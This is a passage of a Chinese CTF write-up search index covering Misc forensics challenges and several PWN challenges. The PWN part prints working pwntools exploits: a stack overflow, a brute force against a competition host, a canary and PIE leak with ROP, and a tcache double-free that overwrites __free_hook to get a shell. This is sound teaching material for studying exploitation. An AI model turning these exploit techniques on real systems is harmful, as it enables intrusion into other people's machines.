\u5c31\u662f\u89e3\u5bc6\u5bc6\u94a5\uff0c\u53ef\u4ee5\u770b\u5230\u5c06\u89e3\u5bc6\u5bc6\u94a5\u4f20\u8fdb\u51fd\u6570\u6700\u540e\u4f1a\u5f97\u5230 conclusion\uff0c\u89c2\u5bdf\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u662f rot13 \u52a0\u5bc6\uff0c\u7f51\u4e0a\u627e\u5230\u89e3\u5bc6\u4ee3\u7801\uff0c\u89e3\u5bc6 conclusion \u5f97\u51fa str=\u201cabcdefgh\u201d \u6700\u540e des \u89e3\u5bc6\u5f97\u51fa flag: flag{1810fc7a8e865dd5} stream \u00b6 \u8003\u67e5\u8981\u70b9\uff1a ADS\uff08\u6570\u636e\u4ea4\u6362\u6d41\uff09 \u4e0b\u8f7d\u9898\u76ee\u540e\u662f\u4e00\u4e2a rar \u538b\u7f29\u5305 \u6253\u5f00\u8be5\u538b\u7f29\u5305\u53d1\u73b0\u538b\u7f29\u5305\u635f\u574f \u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53d1\u73b0 rar \u6587\u4ef6\u5934\u635f\u574f \u8865\u5168 rar \u6587\u4ef6\u5934\uff0c\u4f7f\u7528 winrar \u8fdb\u884c\u89e3\u538b\uff0c\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6587\u4ef6\u5939\u4e2d\u6709 flag.txt \u6587\u4ef6 \u6839\u636e\u9898\u610f stream\uff0c\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u8003\u67e5\u7684\u662f\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 lads \u5de5\u5177\u68c0\u6d4b\u6587\u4ef6\u5939\u53d1\u73b0\u5b58\u5728\u6587\u4ef6\u6d41 \u5728\u547d\u4ee4\u884c\u4e2d\u901a\u8fc7 notepad E:\\documents\\CTF \u9898\u76ee\u6574\u7406\\\u7b2c\u4e00\u5c4a\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b\\f7b44cfafd5c52223d5498196c8a2e7b:realflag.txt \u8bbf\u95ee\u771f\u6b63\u7684 flag \u6587\u4ef6 \u5f97\u5230 flag \u6d41\u91cf\u5206\u6790 \u00b6 \u8003\u67e5\u8981\u70b9\uff1a USB \u534f\u8bae \u4e0b\u8f7d\u6587\u4ef6\u540e\u53d1\u73b0\u662f\u4e00\u4e2a\u6d41\u91cf\u6587\u4ef6\uff0c\u4f7f\u7528 wireshark \u6253\u5f00 \u4f7f\u7528 tshark \u63d0\u53d6 usbdata.txt \u7f16\u5199\u811a\u672c mappings = { 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open('usbdata.txt') for line in keys: \u200b if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': \u200b continue \u200b nums.append(int(line[6:8],16)) keys.close() output = \"\" for n in nums: \u200b if n == 0 : \u200b continue \u200b if n in mappings: \u200b output += mappings[n] \u200b else: \u200b output += '[unknown]' \u200b print( 'output :\\n' + output) \u8fd0\u884c\u811a\u672c\uff0c\u5f97\u5230 flag find others \u00b6 \u8003\u67e5\u8981\u70b9\uff1a png \u6587\u4ef6\u5934 \u4e8c\u7ef4\u7801\u683c\u5f0f \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u56db\u5206\u4e4b\u4e00\u4e8c\u7ef4\u7801 \u6839\u636e\u9898\u76ee\u610f\u601d\u9700\u8981\u5f97\u5230\u53e6\u5916\u5176\u4ed6\u4e09\u4e2a\u90e8\u5206\uff0c\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u53d1\u73b0\u6709\u5176\u4ed6\u4e09\u5f20\u56fe\u7247\u7684\u6570\u636e\uff0c\u4f46\u662f png \u5934\u635f\u574f\u4e86\uff0c\u5c06\u5176\u8865\u5168\u5e76\u63d0\u53d6\u51fa\u6765\uff0c\u5f97\u5230\u56db\u5f20\u56fe\u7247\uff0c\u62fc\u63a5\u8d77\u6765\u540e\u53cd\u8272\u5f97\u5230\u4e8c\u7ef4\u7801\uff0c\u4f7f\u7528\u624b\u673a\u626b\u63cf\u83b7\u5f97 flag \u4e8c\u7ef4\u7801 flag audio \u00b6 \u4e0b\u8f7d\u9644\u4ef6\uff0c\u662f\u4e00\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u8bd5\u542c\u540e\u53d1\u73b0\u662f\u6469\u65af\u7535\u7801\u7684\u58f0\u97f3 \u53ef\u4ee5\u76f4\u63a5\u7528\u542c\u7684\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6bd4\u5982 audition \u6253\u5f00\u540e\uff0c\u5c06\u5176\u6ce2\u5f62\u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u4f7f\u7528\u5de5\u5177\u6216\u8005\u5728\u7ebf\u5de5\u5177\u8f6c\u6362\u6210\u82f1\u6587","title":"MISC"},{"location":"201905/Misc/#misc","text":"","title":"MISC"},{"location":"201905/Misc/#_1","text":"","title":"\u5a49\u59d0\u59d0\u7684\u5185\u5b58\u955c\u50cf"},{"location":"201905/Misc/#_2","text":"\u5185\u5b58\u9690\u5199","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Misc/#_3","text":"\u4f7f\u7528 Volatility \u67e5\u770b\u526a\u5207\u677f\u4fe1\u606f\uff0c\u53d1\u73b0\u4e00\u6bb5 Base64 \u7f16\u7801\uff0c\u4f46\u663e\u793a\u4e0d\u5168\u3002 \u4f7f\u7528\u5341\u516d\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u6587\u4ef6\uff0c\u641c\u7d22\u8fd9\u6bb5 base64 \u7684\u5934 c2NlY3Rm \u83b7\u5f97\u5b8c\u6574\u7684 base64\uff0c\u89e3\u7801\u83b7\u5f97 flag\u3002","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Misc/#_4","text":"","title":"\u8c01\u662f\u534f\u4f1a\u6700\u5f3a\u7684\u4eba"},{"location":"201905/Misc/#_5","text":"\u6587\u4ef6\u62fc\u63a5","title":"\u8003\u67e5\u8981\u70b9"},{"location":"201905/Misc/#_6","text":"\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u662f\u5f20\u56fe\u7247\uff0c\u663e\u793a\u7684\u662f JS \u4e4b\u7236\uff08\u6240\u4ee5\u653e\u8fd9\u5f20\u56fe\u662f\u4e3a\u63d0\u5021\u5f00\u6e90 \uff09\uff0c\u76f4\u63a5\u62d6\u8fdb HxD \u770b\u770b\u6709\u4ec0\u4e48\uff0c\u62c9\u5230\u6700\u540e\u770b\u5230\uff1a \u5f88\u660e\u663e\u7684 base64\uff0c\u89e3\u7801\u770b\u89c1\u4e00\u6bb5\u4ee3\u7801\uff1a \u540d\u5b57\u7b49\u4e8e des\uff0cvalue \u5c31\u662f\u5bc6\u6587\uff0cstr \u5c31\u662f\u89e3\u5bc6\u5bc6\u94a5\uff0c\u53ef\u4ee5\u770b\u5230\u5c06\u89e3\u5bc6\u5bc6\u94a5\u4f20\u8fdb\u51fd\u6570\u6700\u540e\u4f1a\u5f97\u5230 conclusion\uff0c\u89c2\u5bdf\u51fd\u6570\uff0c\u53ef\u4ee5\u770b\u5230\u8fd9\u662f rot13 \u52a0\u5bc6\uff0c\u7f51\u4e0a\u627e\u5230\u89e3\u5bc6\u4ee3\u7801\uff0c\u89e3\u5bc6 conclusion \u5f97\u51fa str=\u201cabcdefgh\u201d \u6700\u540e des \u89e3\u5bc6\u5f97\u51fa flag: flag{1810fc7a8e865dd5}","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Misc/#stream","text":"\u8003\u67e5\u8981\u70b9\uff1a ADS\uff08\u6570\u636e\u4ea4\u6362\u6d41\uff09 \u4e0b\u8f7d\u9898\u76ee\u540e\u662f\u4e00\u4e2a rar \u538b\u7f29\u5305 \u6253\u5f00\u8be5\u538b\u7f29\u5305\u53d1\u73b0\u538b\u7f29\u5305\u635f\u574f \u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u538b\u7f29\u5305\uff0c\u53d1\u73b0 rar \u6587\u4ef6\u5934\u635f\u574f \u8865\u5168 rar \u6587\u4ef6\u5934\uff0c\u4f7f\u7528 winrar \u8fdb\u884c\u89e3\u538b\uff0c\u5f97\u5230\u4e00\u4e2a\u6587\u4ef6\u5939\uff0c\u6587\u4ef6\u5939\u4e2d\u6709 flag.txt \u6587\u4ef6 \u6839\u636e\u9898\u610f stream\uff0c\u53ef\u4ee5\u731c\u6d4b\u9898\u76ee\u8003\u67e5\u7684\u662f\u6587\u4ef6\u6d41\uff0c\u4f7f\u7528 lads \u5de5\u5177\u68c0\u6d4b\u6587\u4ef6\u5939\u53d1\u73b0\u5b58\u5728\u6587\u4ef6\u6d41 \u5728\u547d\u4ee4\u884c\u4e2d\u901a\u8fc7 notepad E:\\documents\\CTF \u9898\u76ee\u6574\u7406\\\u7b2c\u4e00\u5c4a\u56db\u5ddd\u5927\u5b66\u7f51\u7edc\u5b89\u5168\u6280\u80fd\u5927\u8d5b\\f7b44cfafd5c52223d5498196c8a2e7b:realflag.txt \u8bbf\u95ee\u771f\u6b63\u7684 flag \u6587\u4ef6 \u5f97\u5230 flag","title":"stream"},{"location":"201905/Misc/#_7","text":"\u8003\u67e5\u8981\u70b9\uff1a USB \u534f\u8bae \u4e0b\u8f7d\u6587\u4ef6\u540e\u53d1\u73b0\u662f\u4e00\u4e2a\u6d41\u91cf\u6587\u4ef6\uff0c\u4f7f\u7528 wireshark \u6253\u5f00 \u4f7f\u7528 tshark \u63d0\u53d6 usbdata.txt \u7f16\u5199\u811a\u672c mappings = { 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" } nums = [] keys = open('usbdata.txt') for line in keys: \u200b if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': \u200b continue \u200b nums.append(int(line[6:8],16)) keys.close() output = \"\" for n in nums: \u200b if n == 0 : \u200b continue \u200b if n in mappings: \u200b output += mappings[n] \u200b else: \u200b output += '[unknown]' \u200b print( 'output :\\n' + output) \u8fd0\u884c\u811a\u672c\uff0c\u5f97\u5230 flag","title":"\u6d41\u91cf\u5206\u6790"},{"location":"201905/Misc/#find-others","text":"\u8003\u67e5\u8981\u70b9\uff1a png \u6587\u4ef6\u5934 \u4e8c\u7ef4\u7801\u683c\u5f0f \u4e0b\u8f7d\u9644\u4ef6\u5f97\u5230\u4e00\u5f20\u56db\u5206\u4e4b\u4e00\u4e8c\u7ef4\u7801 \u6839\u636e\u9898\u76ee\u610f\u601d\u9700\u8981\u5f97\u5230\u53e6\u5916\u5176\u4ed6\u4e09\u4e2a\u90e8\u5206\uff0c\u4f7f\u7528\u4e8c\u8fdb\u5236\u7f16\u8f91\u5668\u6253\u5f00\u56fe\u7247\uff0c\u53d1\u73b0\u6709\u5176\u4ed6\u4e09\u5f20\u56fe\u7247\u7684\u6570\u636e\uff0c\u4f46\u662f png \u5934\u635f\u574f\u4e86\uff0c\u5c06\u5176\u8865\u5168\u5e76\u63d0\u53d6\u51fa\u6765\uff0c\u5f97\u5230\u56db\u5f20\u56fe\u7247\uff0c\u62fc\u63a5\u8d77\u6765\u540e\u53cd\u8272\u5f97\u5230\u4e8c\u7ef4\u7801\uff0c\u4f7f\u7528\u624b\u673a\u626b\u63cf\u83b7\u5f97 flag \u4e8c\u7ef4\u7801 flag","title":"find others"},{"location":"201905/Misc/#audio","text":"\u4e0b\u8f7d\u9644\u4ef6\uff0c\u662f\u4e00\u4e2a\u97f3\u9891\u6587\u4ef6\uff0c\u8bd5\u542c\u540e\u53d1\u73b0\u662f\u6469\u65af\u7535\u7801\u7684\u58f0\u97f3 \u53ef\u4ee5\u76f4\u63a5\u7528\u542c\u7684\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528\u97f3\u9891\u7f16\u8f91\u8f6f\u4ef6\u6bd4\u5982 audition \u6253\u5f00\u540e\uff0c\u5c06\u5176\u6ce2\u5f62\u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u8f6c\u6362\u6210\u6469\u65af\u7535\u7801 \u4f7f\u7528\u5de5\u5177\u6216\u8005\u5728\u7ebf\u5de5\u5177\u8f6c\u6362\u6210\u82f1\u6587","title":"audio"},{"location":"201905/Pwn/","text":"PWN \u00b6 babystack \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u53d8\u91cf\u5728\u6808\u5e27\u4e2d\u7684\u4f4d\u7f6e\u5173\u7cfb \u6808\u6ea2\u51fa \u89e3\u9898\u8fc7\u7a0b \u00b6 from pwn import * p = remote ( '119.23.206.23' , 10001 ) p . recvuntil ( 'what \\' s your name? \\n ' ) p . send ( 'a' * 0x10 + ' \\x33 ' ) p . interactive () login \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 strncmp \u51fd\u6570\u4f5c\u7528 python \u7206\u7834\u811a\u672c\u7f16\u5199 \u89e3\u9898\u8fc7\u7a0b \u00b6 \u53d1\u73b0\u7a0b\u5e8f\u4e2d\u6bcf\u6b21\u4e0e flag \u7684\u6bd4\u8f83\u90fd\u662f\u4f7f\u7528\u7684 strncmp\uff0c\u56e0\u6b64\u53ef\u4ee5\u9010\u5b57\u8282\u7206\u7834 \u6ce8\uff1a strncmp(\"sc\", \"scuctf{...}\", 2) == 0 from pwn import * context . log_level = 'critical' table = list ( string . printable ) current = '' while ( True ): #p = process('./login') p = remote ( '119.23.206.23' , 10002 ) p . recvuntil ( 'What your name? \\n ' ) p . sendline ( 'hgy' ) for i in table : tmp = current + i p . recvuntil ( 'Your password :' ) p . send ( tmp ) res = p . recvline () if \"Welcome\" in res : current += i print current p . close () break p . interactive () noflag \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u6808\u6ea2\u51fa canary \u7ed5\u8fc7 rop \u89e3\u9898\u8fc7\u7a0b \u00b6 \u5728 main \u51fd\u6570\u4e2d\u5b58\u5728\u4e24\u6b21\u8f93\u5165\uff0c\u7b2c\u4e00\u6b21\u8f93\u51fa\u4f1a\u88ab\u91cd\u65b0\u6253\u5370\u51fa\u6765\u3002 \u56e0\u4e3a\u4f7f\u7528\u7684 read \u63a5\u53d7\u7684\u8f93\u5165\uff0c\u6240\u4ee5\u5728\u5b57\u7b26\u4e32\u672b\u5c3e\u4e0d\u4f1a\u6dfb\u52a0'\\0'\uff0c\u90a3\u4e48\u5728\u8f93\u51fa\u65f6\u5c31\u4e0d\u4f1a\u622a\u65ad\uff0c\u7531\u6b64\u53ef\u4ee5\u4e00\u6b21\u6027\u6cc4\u9732\u51fa\u6808\u4e0a\u7684 canary \u548c\u7a0b\u5e8f\u6bb5\u5730\u5740\u3002 \u53ea\u8981\u8f93\u5165 0x29 \u4e2a'a',\u5c31\u80fd\u6070\u597d\u8986\u76d6\u6389 canary \u6700\u4f4e\u4f4d\u7684'\\x00'\uff0c\u7136\u540e\u5f53\u7a0b\u5e8f\u8f93\u51fa\u65f6\uff0c\u5c31\u53ef\u4ee5\u6210\u529f\u6cc4\u9732\u51fa canary \u4ee5\u53ca\u5b83\u540e\u9762\u7684\u4e00\u4e2a\u4ee3\u7801\u6bb5\u7684\u5730\u5740\u3002\u8be5\u4ee3\u7801\u6bb5\u5730\u5740\u4e0e\u4ee3\u7801\u6bb5\u57fa\u5740\u6709\u4e00\u4e2a\u56fa\u5b9a\u7684\u504f\u79fb\uff0c\u51cf\u53bb\u8be5\u504f\u79fb\u65e2\u53ef\u83b7\u5f97\u57fa\u5740\u3002\u5230\u6b64\uff0c\u4e5f\u5c31\u540c\u65f6\u7ed5\u8fc7\u4e86 pie \u548c canary\u3002 \u7136\u540e\u7a0b\u5e8f\u4f1a\u63a5\u53d7\u7b2c\u4e8c\u6b21\u8f93\u5165\uff0c\u8fd9\u6b21\u8f93\u5165\u5c31\u9700\u8981\u4fee\u590d\u521a\u521a\u88ab\u4fee\u6539\u6389\u6700\u540e\u4e00\u5b57\u8282\u7684 canary\uff0c\u540c\u65f6\u5c06\u8fd4\u56de\u5730\u5740\u4fee\u6539\u4e3a main \u51fd\u6570\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u4e8c\u6b21\u5229\u7528\u6f0f\u6d1e\u4e86 \u5728\u7b2c\u4e8c\u6b21\u6267\u884c main \u51fd\u6570\u4e2d\uff0c\u5728\u8f93\u5165\u65f6\u8f93\u5165 0xc0 \u4e2a'a'\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa\u4e00\u4e2a\u4f4d\u4e8e ld \u4e2d\u7684\u5730\u5740\uff0c\u6539\u5730\u5740\u5230 libc \u57fa\u5740\u7684\u504f\u79fb\u56fa\u5b9a\uff0c\u6240\u4ee5\u7531\u6b64\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u57fa\u5740\u3002 \u5728\u7b2c\u4e8c\u6b21\u8f93\u5165\u65f6\uff0c\u7531\u4e8e\u6cc4\u9732\u51fa\u4e86 libc \u57fa\u5740\uff0c\u5c31\u53ef\u4ee5\u901a\u8fc7 rop \u4e3a\u6240\u6b32\u4e3a\u4e86 2333\u3002\u8fd9\u91cc exp \u662f\u7528\u7684 one_gadget\uff0c\u56e0\u4e3a\u4e8b\u5148\u5df2\u7ecf\u901a\u8fc7 rop \u6cc4\u9732\u51fa\u7684\u51fd\u6570\u5730\u5740\u5f97\u5230\u4e86\u8fdc\u7a0b\u7684 libc \u7248\u672c\u4e3a 2.23(rop \u4ee3\u7801\u5c31\u4e0d\u7ed9\u51fa\u4e86)\u3002 from pwn import * p = process ( './noflag' ) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0x29 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0x29 ) p . recvuntil ( 'a' * 0x28 ) canary = u64 ( p . recvn ( 8 )) / 0x100 * 0x100 pie = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0xe10 print \"canary: %#x \" % canary print \"pie: %#x \" % pie main = pie + 0xd21 p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0x40 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( main )) p . recvuntil ( 'length of name: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'name: \\n ' ) p . send ( 'a' * 0xc0 ) p . recvuntil ( 'a' * 0xc0 ) libc_base = u64 ( p . recvuntil ( 'l' )[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3da7cb print \"libc_base: %#x \" % libc_base one_gadget = libc_base + 0x4526a payload = 'a' * 0x28 + p64 ( canary ) + p64 ( 0xdeadbeef ) + p64 ( one_gadget ) payload = payload . ljust ( 0xc0 , ' \\x00 ' ) p . recvuntil ( 'of introduction: \\n ' ) p . sendline ( str ( 0xc0 )) p . recvuntil ( 'introduction: \\n ' ) p . send ( payload ) p . interactive () \u7136\u800c\u8fd9\u9898\u4e0d\u6b62\u4e00\u4e2a\u89e3\uff0c\u53ef\u4ee5\u4e0d\u7528\u6cc4\u9732 libc\uff0c\u901a\u8fc7\u6784\u9020 rop \u8c03\u7528 fopen \u548c fscanf \u6765\u8bfb\u53d6 flag \u4e5f\u884c\uff0c\u4e0d\u8fc7\u5c31\u9ebb\u70e6\u4e86\u8bb8\u591a\u3002 club \u00b6 \u8003\u5bdf\u8981\u70b9 \u00b6 \u901a\u8fc7\u5199\u6cc4\u9732\u5806\u5730\u5740\u63a8\u6d4b libc \u7248\u672c fastbin attack \u901a\u8fc7 unsorted bin \u6cc4\u9732 libc tcache \u5229\u7528 \u89e3\u9898\u601d\u8def \u00b6 \u68c0\u67e5\u9898\u76ee\u4fdd\u62a4\uff0c\u53d1\u73b0\u4fdd\u62a4\u5168\u5f00 \u9996\u5148\u8fde\u7eed\u6dfb\u52a0\u591a\u4e2a member\uff0c\u7136\u540e\u518d\u4f9d\u6b21\u91ca\u653e\u7b2c\u4e00\u4e2a\u548c\u7b2c\u4e8c\u4e2a member\uff0c\u4f7f\u5f97\u7b2c\u4e8c\u4e2a chunk \u7684 fd \u6307\u5411\u4e86\u7b2c\u4e00\u4e2a chunk \u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u7b2c\u4e8c\u4e2a chunk \u5206\u914d\u51fa\u6765\uff0cname \u8bbe\u7f6e\u4e3a'b'\uff0c\u8fd9\u53ea\u4f1a\u4fee\u6539\u6389\u5806\u5730\u5740\u7684\u6700\u540e\u4e00\u4e2a\u5b57\u8282\u3002\u901a\u8fc7 edit(1, 'b')\u8f93\u51fa\u8be5 chunk \u7684 fd\u3002\u53ef\u4ee5\u53d1\u73b0\uff0c\u5730\u5740\u7684\u7b2c 3 \u4f4d\u4e0d\u4e3a 0\uff0c\u800c\u662f 2\uff0c\u8fd9\u5c31\u610f\u5473\u7740\u5806\u4e0a\u4e8b\u5148\u5206\u914d\u4e86\u4e00\u4e2a 0x200 \u5927\u5c0f\u4ee5\u4e0a\u7684 chunk\uff0c\u8054\u7cfb\u5230 libc2.27 \u4ee5\u4e0a\u4f1a\u5728\u5806\u4e0a\u5f00\u8f9f\u4e00\u4e2a 0x250 \u5927\u5c0f\u7684\u7a7a\u95f4\u7528\u4e8e\u7ba1\u7406 tcache\uff0c\u4ece\u800c\u786e\u5b9a\u6587\u4ef6\u73af\u5883\u662f\u5b58\u5728 tcache \u7684\u3002 \u89c2\u5bdf\u5230\u6bcf\u6b21 remove \u90fd\u4f1a\u6e05\u7a7a name\uff0c\u4f46\u662f\u5f53\u6211 remove \u65f6\u53ea\u8f93\u5165\u56de\u8f66\uff0c\u5c31\u4f1a\u5bfc\u81f4'\\0'\u4e0e'\\0'\u6bd4\u8f83\uff0c\u4ece\u800c\u4f7f\u5df2\u7ecf free \u7684\u5806\u5757\u518d\u6b21\u88ab\u91ca\u653e\uff0c\u9020\u6210 double free\u3002\u7531\u56e0\u4e3a\u5177\u6709 tcache\uff0c\u6240\u4ee5\u6211\u4eec\u53ef\u4ee5\u5f88\u5bb9\u6613\u7684\u5728\u4efb\u610f\u5730\u5740\u5206\u914d chunk\u3002 \u4e3a\u4e86\u6cc4\u9732 libc \u7684\u57fa\u5740\uff0c\u5148\u901a\u8fc7 double free\uff0c\u5728\u5806\u4e0a\u5206\u914d\u4e00\u4e2a\u9519\u4f4d\u4e86 chunk\uff0c\u4ece\u800c\u53ef\u4ee5\u4fee\u6539\u6389\u4e00\u4e2a\u6b63\u5e38\u5806\u5757 victim \u7684 size\uff0c\u5c06 size \u4fee\u6539\u4e3a 0xc1\uff0c\u4f7f\u5176\u53d8\u6210\u4e00\u4e2a smallchunk\uff0c\u7136\u540e\u91ca\u653e\u6389 victim\uff0c\u5c31\u53ef\u4ee5\u5728 fd \u548c bk \u7684\u4f4d\u7f6e\u83b7\u5f97 libc \u4e2d\u7684\u5730\u5740\u3002\u518d\u6b21\u5c06\u8be5\u5904\u5185\u5b58\u5206\u914d\u51fa\u6765\uff0c\u5c31\u53ef\u4ee5\u6cc4\u9732\u51fa libc \u7684\u5730\u5740\u4e86\u3002 \u901a\u8fc7 double free \u5728__free_hook \u5904\u5206\u914d chunk\uff0c\u7136\u540e\u5199\u5165 libc2.27 \u7684 one_gadget \u7684\u5730\u5740\u6210\u529f getshell from pwn import * context . log_level = 'debug' p = process ( \"./contact\" ) libc = ELF ( './libc.so.6' ) #libc\u7248\u672c\u4e3a2.27 def add ( name , description ): p . recvuntil ( '> ' ) p . sendline ( '1' ) p . recvuntil ( 'name: ' ) p . sendline ( name ) p . recvuntil ( 'description(max 0x29bytes): \\n ' ) p . send ( description ) def remove ( name ): p . recvuntil ( '> ' ) p . sendline ( '2' ) p . recvuntil ( 'name of member: \\n ' ) p . sendline ( name ) def edit ( idx , description ): p . recvuntil ( '> ' ) p . sendline ( '3' ) p . recvuntil ( 'number of member: \\n ' ) p . sendline ( str ( idx )) p . recvuntil ( 'new description: \\n ' ) p . send ( description ) add ( 'a' , 'a' ) add ( 'b' , 'b' ) add ( 'c' , 'c' ) add ( 'd' , 'd' ) add ( 'e' , 'e' ) add ( 'x' , 'x' ) add ( 'x' , 'x' ) remove ( 'x' ) remove ( 'x' ) remove ( 'a' ) remove ( '' ) add ( 'a' , 'a' ) edit ( 0 , 'a' ) p . recvuntil ( 'a: ' ) heap_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) / 0x1000 * 0x1000 + 0x250 print \"heap_base: %#x \" % heap_base payload = p64 ( heap_base + 0x30 ) edit ( 0 , payload ) add ( 'f' , 'f' ) payload = p64 ( 0 ) * 3 + p64 ( 0xc1 ) add ( 'g' , payload ) remove ( 'b' ) for _ in range ( 7 ): remove ( '' ) add ( 'b' , 'b' ) edit ( 1 , 'a' * 8 ) p . recvuntil ( 'b: aaaaaaaa' ) libc_base = u64 ( p . recvline ()[: - 1 ] . ljust ( 8 , ' \\x00 ' )) - 0x3ebd50 free_hook = libc_base + libc . symbols [ '__free_hook' ] one_gadget = libc_base + 0x4f322 print \"libc_base: %#x \" % libc_base print \"free_hook: %#x \" % free_hook edit ( 1 , p64 ( 0 )) remove ( 'a' ) remove ( '' ) add ( 'a' , p64 ( free_hook )) add ( 't' , '/bin/sh \\x00 ' ) add ( 'p' , p64 ( one_gadget )) remove ( 't' ) p . interactive ()","title":"PWN"},{"location":"201905/Pwn/#pwn","text":"","title":"PWN"},{"location":"201905/Pwn/#babystack","text":"","title":"babystack"},{"location":"201905/Pwn/#_1","text":"\u53d8\u91cf\u5728\u6808\u5e27\u4e2d\u7684\u4f4d\u7f6e\u5173\u7cfb \u6808\u6ea2\u51fa","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Pwn/#_2","text":"from pwn import * p = remote ( '119.23.206.23' , 10001 ) p . recvuntil ( 'what \\' s your name? \\n ' ) p . send ( 'a' * 0x10 + ' \\x33 ' ) p . interactive ()","title":"\u89e3\u9898\u8fc7\u7a0b"},{"location":"201905/Pwn/#login","text":"","title":"login"},{"location":"201905/Pwn/#_3","text":"strncmp \u51fd\u6570\u4f5c\u7528 python \u7206\u7834\u811a\u672c\u7f16\u5199","title":"\u8003\u5bdf\u8981\u70b9"},{"location":"201905/Pwn/#_4","text":"\u53d1\u73b0\u7a0b\u5e8f\u4e2d\u6bcf\u6b21\u4e0e flag \u7684\u6bd4\u8f83\u90fd\u662f\u4f7f\u7528\u7684 strncmp\uff0c\u56e0\u6b64\u53ef\u4ee5\u9010\u5b57\u8282\u7206\u7834 \u6ce8\uff1a strncmp(\"sc\", \"scuctf{...}\", 2) == 0 from pwn import * context . log_level = 'critical' table = list ( string . printable ) current = '' while ( True ): #p = process('./login') p = remote ( '119.23.206.23' , 10002 ) p . recvuntil ( 'What your name? \\n ' ) p . sendline ( 'hgy' ) for i in table : tmp = current + i p . recvuntil ( 'Your password :' ) p . send ( tmp ) res = p . recvline () if \"Welcome\" in res : current += i print current p . close () break p . interactive 